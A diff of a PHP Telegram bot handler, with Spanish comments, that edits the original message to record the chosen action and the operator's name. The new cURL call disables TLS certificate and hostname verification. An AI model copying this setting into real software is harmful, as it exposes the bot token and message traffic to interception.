@@ -55,18 +55,33 @@ if (!$action) {
                     if (in_array($actionType, $validActions)) {
                         $action = $actionType;
 
-                        // Eliminar los botones del mensaje original
-                        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageReplyMarkup");
-                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                        curl_setopt($ch, CURLOPT_POST, true);
-                        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
-                            'chat_id' => $config['chat_id'],
-                            'message_id' => $messageId,
-                            'reply_markup' => json_encode(['inline_keyboard' => []])
-                        ]));
-                        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-                        curl_exec($ch);
-                        curl_close($ch);
+                        $from = $update['callback_query']['from'] ?? [];
+                        $operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
+                        if (empty($operador)) $operador = 'Operador';
+
+                        $origText = $update['callback_query']['message']['text'] ?? '';
+                        if ($origText !== '') {
+                            $newText  = $origText;
+                            $newText .= "\n\n————————————\n";
+                            $newText .= "✅ Acción: <b>{$actionType}</b>\n";
+                            $newText .= "👤 Operador: <b>{$operador}</b>";
+
+                            $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
+                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                            curl_setopt($ch, CURLOPT_POST, true);
+                            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
+                                'chat_id' => $config['chat_id'],
+                                'message_id' => $messageId,
+                                'text' => $newText,
+                                'parse_mode' => 'HTML',
+                                'reply_markup' => json_encode(['inline_keyboard' => []])
+                            ]));
+                            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+                            curl_exec($ch);
+                            curl_close($ch);
+                        }
                     }
                 }
 
